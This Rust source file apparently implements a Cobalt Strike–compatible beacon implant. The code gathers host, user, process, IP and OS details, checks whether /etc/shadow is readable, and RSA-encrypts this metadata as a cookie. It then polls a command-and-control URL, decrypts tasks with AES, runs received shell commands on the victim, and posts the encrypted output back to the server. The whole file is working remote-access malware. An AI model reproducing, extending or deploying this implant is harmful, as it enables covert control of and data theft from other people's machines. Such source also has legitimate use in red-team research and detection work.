// use core::slice::SlicePattern;
/// b1tg @ 2022/11/19
use std::{
    cell::Cell,
    fmt::format,
    fs,
    io::{BufReader, Read},
    net::{Ipv4Addr, SocketAddr, SocketAddrV4, IpAddr},
    os::raw,
    process::Command,
    vec,
};
// use sha2::Sha256;
use bytes::{BufMut, BytesMut};
use hmac::{Hmac, Mac};
use rsa::{pkcs8::DecodePublicKey, PaddingScheme, PublicKey, RsaPrivateKey, RsaPublicKey};
use sha2::{Digest, Sha256, Sha512};
// use aes::cipher::{block_padding::Pkcs7, BlockDecryptMut, BlockEncryptMut, KeyIvInit};
use byteorder::{ReadBytesExt, BE};
use crypto::{
    aes::{self, KeySize},
    blockmodes::PaddingProcessor,
    buffer::{BufferResult, ReadBuffer, RefReadBuffer, WriteBuffer},
    symmetriccipher,
};
use std::io::Cursor;
use local_ip_address::local_ip;
use crypt::*;
use profile::{C2_GET_URL, C2_POST_URL, PUB_KEY, USER_AGENT};
use utils::*;


mod crypt;
mod profile;
mod utils;


const CMD_TYPE_SLEEP: u32 = 4;
const CMD_TYPE_SHELL: u32 = 78; //0x4E
const CMD_TYPE_UPLOAD_START: u32 = 10; // 0x0A
const CMD_TYPE_UPLOAD_LOOP: u32 = 67; // 0x43
const CMD_TYPE_DOWNLOAD: u32 = 11; // 0x0B
const CMD_TYPE_EXIT: u32 = 3; // 0x03
const CMD_TYPE_CD: u32 = 5; // 0x05
const CMD_TYPE_PWD: u32 = 39; // 0x27
const CMD_TYPE_FILE_BROWSE: u32 = 53; // 0x35

#[derive(Debug)]
struct Beacon {
    id: u32,
    base_key: [u8; 16],
    aes_key: [u8; 16],
    hmac_key: [u8; 16],
}

use anyhow::Result;

impl Beacon {
    fn init() -> Self {
        let key = Rng::new().gen_bytes(16);
        let mut hasher = Sha256::new();
        hasher.update(&key);
        let sha256hash = hasher.finalize();
        assert_eq!(sha256hash.len(), 32);
        let aes_key = &sha256hash[0..16];
        let hmac_key = &sha256hash[16..];
        let mut beacon_id = Rng::new().rand_range(100000, 999998) as u32;
        if beacon_id % 2 != 0 {
            beacon_id += 1;
        }
        Beacon {
            id: beacon_id,
            base_key: key.as_slice().try_into().unwrap(),
            aes_key: aes_key.try_into().unwrap(),
            hmac_key: hmac_key.try_into().unwrap(),
        }
    }

    fn get_os_type() -> Option<String> {
        match std::env::consts::OS {
            "linux" => Some("Linux".into()),
            "windows" => Some("Windows".into()),
            "macos" => Some("macOS".into()),
            _ => None,
        }
    }

    fn linux_collect_info(&self) -> Result<String> {
        let process_id = std::process::id();
        let ssh_port = 0u16;
        let metadata_flag = {
            let mut flag = 0u8;
            if fs::read("/etc/shadow").is_ok() {
                flag += 8;
            } else if Command::new("uname").arg("-p").output().unwrap().stdout == b"x86_64\n" {
                flag += 4;
            } else if std::env::consts::ARCH == "x86_64" {
                flag += 2;
            } else {
                flag += 1;
            }
            flag
        };
        // 5.15.0-48-generic
        let os_version = os_system("uname -r").unwrap_or("unknow_version".into());
        let os_version_maj = os_version
            .split(".")
            .nth(0)
            .map(|x| x.parse::<usize>().unwrap())
            .unwrap() as u8;
        let os_version_min = os_version
            .split(".")
            .nth(1)
            .map(|x| x.parse::<usize>().unwrap())
            .unwrap() as u8;
        let os_build = 48u16;
        let ptr_func_addr = 0u32;
        let ptr_gmh_func_addr = 0u32;
        let ptr_gpa_func_addr = 0u32;
        let process_name: String = {
            let cur_exe = std::env::current_exe().unwrap();
            let name = cur_exe.file_name().unwrap();
            name.to_string_lossy().to_string()
        };
        let host_name =
            String::from_utf8(Command::new("hostname").output().unwrap().stdout).unwrap();
        let host_name = host_name.trim();
        let user_name = os_system("whoami").unwrap_or("unknow_name".into());
        let local_ip = u32::from_le_bytes("127.0.0.1".parse::<Ipv4Addr>().unwrap().octets());
        let os_info = format!("{}\t{}\t{}", &host_name, &user_name, &process_name).into_bytes();
        let locale_ansi = 936u16;
        let locale_oem = 936u16;
        let online_info = [
            &self.id.to_be_bytes()[..],
            &process_id.to_be_bytes()[..],
            &ssh_port.to_be_bytes()[..],
            &metadata_flag.to_be_bytes()[..],
            &os_version_maj.to_be_bytes()[..],
            &os_version_min.to_be_bytes()[..],
            &os_build.to_be_bytes()[..],
            &ptr_func_addr.to_be_bytes()[..],
            &ptr_gmh_func_addr.to_be_bytes()[..],
            &ptr_gpa_func_addr.to_be_bytes()[..],
            &local_ip.to_be_bytes()[..],
            &os_info,
        ]
        .concat();
        let meta_info = [
            &self.base_key,
            &locale_ansi.to_be_bytes()[..],
            &locale_oem.to_be_bytes()[..],
            &online_info,
        ]
        .concat();
        let magic = 0xbeefu32;
        let raw_pkg = [
            &magic.to_be_bytes()[..],
            &(meta_info.len() as u32).to_be_bytes()[..],
            meta_info.as_slice(),
        ]
        .concat();
        let public_key = RsaPublicKey::from_public_key_pem(PUB_KEY).expect("wrong PEM format");
        let padding = PaddingScheme::new_pkcs1v15_encrypt();
        let mut rng = rand::thread_rng();
        let enc_pkg = public_key.encrypt(&mut rng, padding, &raw_pkg[..])?;
        let pkg = base64::encode_config(enc_pkg, base64::STANDARD);
        Ok(pkg)
    }

    fn windows_collect_info(&self) -> Result<String> {
        let process_id = std::process::id();
        let port = 0u16;
        let metadata_flag = 0u8;
        let os_version = win_os_system("ver").unwrap_or("unknow_version".into());
        let mut os_version_maj: u8 = 0;
        if let Some(version_str) = os_version.split(".").next() {
            if let Ok(version_num) = version_str
                .chars()
                .filter(|c| c.is_digit(10))
                .collect::<String>()
                .parse::<usize>()
            {
                os_version_maj = version_num as u8;
            }
        }
        let os_version_min = os_version
            .split(".")
            .nth(1)
            .map(|x| x.parse::<usize>().unwrap())
            .unwrap() as u8;
        let os_build: u16 = 0;
        let ptr_func_addr = 0u32;
        let ptr_gmh_func_addr = 0u32;
        let ptr_gpa_func_addr = 0u32;
        let process_name: String = {
            let cur_exe = std::env::current_exe().unwrap();
            let name = cur_exe.file_name().unwrap();
            name.to_string_lossy().to_string()
        };
        let host_name = win_os_system("hostname").unwrap_or("unknow_hostname".into());
        let user_name = win_os_system("whoami").unwrap_or("unknow_name".into());
        let local_ip = match local_ip() {
            Ok(ip) => {
                println!("本机的内网 IP 地址是: {:?}", ip);
                ip
            },
            Err(e) => {
                eprintln!("无法获取内网 IP 地址: {}", e);
                IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1))
            }
        };
        let mut ip_bytes = match local_ip {
            IpAddr::V4(ipv4) => ipv4.octets().to_vec(),
            IpAddr::V6(ipv6) => ipv6.octets().to_vec(),
        };
        //进行反转--要不然cs不能正常显示
        ip_bytes.reverse();
        let os_info = format!("{}\t{}\t{}", &host_name, &user_name, &process_name).into_bytes();
        let locale_ansi = 936u16;
        let locale_oem = 936u16;
        let online_info = [
            &self.id.to_be_bytes()[..],
            &process_id.to_be_bytes()[..],
            &port.to_be_bytes()[..],
            &metadata_flag.to_be_bytes()[..],
            &os_version_maj.to_be_bytes()[..],
            &os_version_min.to_be_bytes()[..],
            &os_build.to_be_bytes()[..],
            &ptr_func_addr.to_be_bytes()[..],
            &ptr_gmh_func_addr.to_be_bytes()[..],
            &ptr_gpa_func_addr.to_be_bytes()[..],
            &ip_bytes[..],
            &os_info,
        ]
        .concat();
        let meta_info = [
            &self.base_key,
            &locale_ansi.to_be_bytes()[..],
            &locale_oem.to_be_bytes()[..],
            &online_info,
        ]
        .concat();
        let magic = 0xbeefu32;
        let raw_pkg = [
            &magic.to_be_bytes()[..],
            &(meta_info.len() as u32).to_be_bytes()[..],
            meta_info.as_slice(),
        ]
        .concat();
        let public_key = RsaPublicKey::from_public_key_pem(PUB_KEY).expect("wrong PEM format");
        let padding = PaddingScheme::new_pkcs1v15_encrypt();
        let mut rng = rand::thread_rng();
        let enc_pkg = public_key.encrypt(&mut rng, padding, &raw_pkg[..])?;
        let pkg = base64::encode_config(enc_pkg, base64::STANDARD);
        Ok(pkg)
    }

}

fn main() {
    let beacon = Beacon::init();

    let cookie = match Beacon::get_os_type().as_deref() {
        Some("Linux") => beacon.linux_collect_info(),
        Some("Windows") => beacon.windows_collect_info(),
        Some("macOS") => beacon.linux_collect_info(),
        _ => beacon.linux_collect_info(),
    }
        .unwrap_or_else(|_| panic!("collect info error"));
    let mut counter = 1u32;
    println!("starting connect to {}", C2_GET_URL);
    loop {
        let http_res = Strike::http_get(C2_GET_URL, &cookie, USER_AGENT);
        if let Ok(res) = http_res {
            let content_length = res.content_length().unwrap() as usize;
            // continue;
            if content_length > 0 {
                println!("get response with size={}", content_length);
                let content = res.bytes().unwrap();
                // let hmac_hash = &content[content_length - 16..];
                let rest_bytes = &content[..content_length - 16];
                let iv = b"abcdefghijklmnop";
                let decrypted = aes_decrypt(rest_bytes, &beacon.aes_key, iv).unwrap();
                hexdump::hexdump(&decrypted);
                let mut decrypted_cursor = Cursor::new(decrypted);
                // |634bfc59 00000026 0000004e 0000001e| cK.Y...&...N.... 00000000
                // |00000009 25434f4d 53504543 25000000| ....%COMSPEC%... 00000010
                // |0b202f43 20697020 61646472 00004141| . /C ip addr..AA 00000020
                let timestamp = decrypted_cursor.read_u32::<BE>().unwrap();
                let cmd_len1 = decrypted_cursor.read_u32::<BE>().unwrap();
                let cmd_type = decrypted_cursor.read_u32::<BE>().unwrap();
                let cmd_len = decrypted_cursor.read_u32::<BE>().unwrap();
                if cmd_type == CMD_TYPE_SHELL {
                    // <app_len:u32> <app_data>
                    // <arg_len:u32> <arg_data>
                    let app_path = read_data(&mut decrypted_cursor).unwrap();
                    let args = read_data(&mut decrypted_cursor).unwrap();
                    println!(
                        "CMD_TYPE_SHELL: app_path: {:?}",
                        String::from_utf8_lossy(&app_path)
                    );
                    println!("CMD_TYPE_SHELL: args: {:?}", String::from_utf8_lossy(&args));
                    // CMD_TYPE_SHELL: app_path: "%COMSPEC%"
                    // CMD_TYPE_SHELL: args: " /C ip addr"
                    let args = String::from_utf8_lossy(&args);
                    let args = args.replace("/C", "");
                    let args = args.trim();
                    let output = os_system_anyway(&args);
                    let iv = b"abcdefghijklmnop";

                    let reply_type = 0u32;
                    let raw_pkg = [
                        &counter.to_be_bytes()[..],
                        &(output.len() as u32 + 4).to_be_bytes()[..],
                        &reply_type.to_be_bytes()[..],
                        &output.as_bytes()[..],
                    ]
                    .concat();
                    counter += 1;
                    let raw_pkg_encrypted =
                        aes_encrypt(&raw_pkg.as_slice(), &beacon.aes_key, iv).unwrap();
                    let hash = hmac_hash(&beacon.hmac_key, raw_pkg_encrypted.as_slice());
                    let buf = [
                        &(raw_pkg_encrypted.len() as u32 + 16).to_be_bytes()[..],
                        raw_pkg_encrypted.as_slice(),
                        &hash[..],
                    ]
                    .concat();
                    println!("output: {}", output);
                    println!(
                        "raw_pkg, len:{}, data:{:?}",
                        raw_pkg.len(),
                        hexdump::hexdump(&raw_pkg)
                    );
                    println!("buf, len:{}, data:{:?}", buf.len(), hexdump::hexdump(&buf));
                    let url = format!("{}{}", C2_POST_URL, beacon.id);
                    let post_res = Strike::http_post(&url, "", "", buf);
                    dbg!(post_res);
                } else {
                    println!("UNKNOW: cmd_content: {:?}", "&cmd_content");
                }
            } else {
                println!("heartbeat..")
            }
        } else {
            println!("http error: {:?}", http_res.err())
        }
        std::thread::sleep(std::time::Duration::from_secs(5));
    }
}

#[test]
fn test_reply_pkg() {
    let result = reply_pkg(b"ABC");
    let expect = [
        0, 0, 0, 32, 218, 50, 53, 247, 185, 189, 208, 157, 205, 96, 140, 30, 214, 72, 253, 213, 1,
        229, 205, 140, 39, 57, 163, 175, 72, 244, 5, 131, 124, 15, 32, 229,
    ];
    assert_eq!(result, expect);
}

fn reply_pkg(data: &[u8]) -> Vec<u8> {
    let iv = b"abcdefghijklmnop";
    let aes_key = b"abcdefghijklmnop";
    let hmac_key = b"";
    let counter = 1u32;
    let reply_type = 0u32;
    let raw_pkg = [
        &counter.to_be_bytes()[..],
        &(data.len() as u32 + 4).to_be_bytes()[..],
        &reply_type.to_be_bytes()[..],
        &data,
    ]
        .concat();
    let raw_pkg_encrypted = aes_encrypt(&raw_pkg.as_slice(), aes_key, iv).unwrap();
    let hash = hmac_hash(hmac_key, raw_pkg_encrypted.as_slice());
    let buf = [
        &(raw_pkg_encrypted.len() as u32 + 16).to_be_bytes()[..],
        raw_pkg_encrypted.as_slice(),
        &hash[..],
    ]
    .concat();
    return buf;
}

fn rdtsc() -> u64 {
    unsafe { std::arch::x86_64::_rdtsc() }
}

/// A random number generator based off of xorshift64
struct Rng(u64);

impl Rng {
    fn new() -> Self {
        Rng(0x8644d6eb17b7ab1a ^ rdtsc())
    }
    #[inline]
    fn rand(&mut self) -> usize {
        let val = self.0;
        self.0 ^= self.0 << 13;
        self.0 ^= self.0 >> 17;
        self.0 ^= self.0 << 43;
        val as usize
    }
    fn rand_range(&mut self, min: u64, max: u64) -> usize {
        (self.0 % (max - min) + min) as usize
    }
    fn gen_bytes(&mut self, len: usize) -> Vec<u8> {
        let mut res: Vec<u8> = vec![];
        for i in 0..len {
            res.push(self.rand() as u8);
        }
        res
    }
}